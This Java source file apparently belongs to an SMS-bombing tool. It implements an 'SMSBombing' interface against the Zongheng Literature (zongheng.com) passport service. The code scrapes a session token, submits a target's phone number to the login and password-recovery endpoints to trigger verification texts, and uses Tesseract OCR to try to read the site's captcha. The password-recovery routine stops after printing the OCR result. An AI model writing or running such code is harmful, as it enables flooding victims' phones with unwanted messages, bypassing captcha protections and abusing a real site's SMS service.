package zzq.sms.service.impl;

import cn.hutool.core.io.file.FileWriter;
import cn.hutool.http.HttpRequest;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import net.sourceforge.tess4j.ITesseract;
import net.sourceforge.tess4j.Tesseract;
import net.sourceforge.tess4j.TesseractException;
import zzq.sms.service.SMSBombing;

import java.io.File;
import java.io.InputStream;

/**
 * 纵横文学
 */
public class VerticalAndHorizontalLiterature implements SMSBombing {

    @Override
    public void sendSms(String phone) {
        //sendLoginSms(phone);

        sendRetrievePassword(phone);
    }

    /**
     * 登录短信验证码
     * @param phone
     */
    private void sendLoginSms(String phone) {
        String TK = getTK();

        JSONObject preregcheckJsonObject = getPreregcheckJsonObject(phone, TK);
        String captKey = preregcheckJsonObject.getJSONObject("data").getStr("captKey");

        String sendloginsmsParams = "phone="+phone+"&tk="+TK+"&captkey="+captKey+"&capt=";
        String body = HttpRequest.post("https://passport.zongheng.com/sendloginsms.do")
                .body(sendloginsmsParams)
                .execute().body();
    }

    /**
     * 找回密码
     * @param phone
     */
    public void sendRetrievePassword(String phone){
        String TK = getTK();
        JSONObject preregcheckJsonObject = getPreregcheckJsonObject(phone, TK);
        String captKey = preregcheckJsonObject.getJSONObject("data").getStr("captkey");

        InputStream imgStream = HttpRequest.get("https://passport.zongheng.com/passimg?captkey=" + captKey)
                .execute()
                .bodyStream();

        File imageFile = FileWriter.create(new File("img.jpg")).writeFromStream(imgStream);

        ITesseract iTesseract = new Tesseract();  // JNA Interface Mapping

        iTesseract.setLanguage("eng");
        iTesseract.setDatapath("D:\\Sources.git\\zzq\\zzq-games\\sms\\src\\main\\resources\\tessdata"); // path to tessdata directory
        try {
            String result = iTesseract.doOCR(imageFile);
            System.out.println(result);
        } catch (TesseractException e) {
            System.err.println(e.getMessage());
        }



    }

    /**
     * 获取TK
     * @return
     */
    private String getTK() {
        String TK = null;
        String mainBody = HttpRequest.get("https://passport.zongheng.com/")
                .execute()
                .body();
        if(mainBody!=null){
            int beginIndex = mainBody.indexOf("var TK    = \"");
            TK = mainBody.substring(beginIndex+13,beginIndex+13+19);
        }
        return TK;
    }

    /**
     * 预检
     * @param phone
     * @param TK
     * @return
     */
    private JSONObject getPreregcheckJsonObject(String phone, String TK) {
        String preregcheckParams = "tk="+TK+"&unam="+phone+"&t="+System.currentTimeMillis();
        String preregcheckBody = HttpRequest.post("https://passport.zongheng.com/preregcheck.do")
                .body(preregcheckParams)
                .execute()
                .body();
        return JSONUtil.parseObj(preregcheckBody);
    }
}
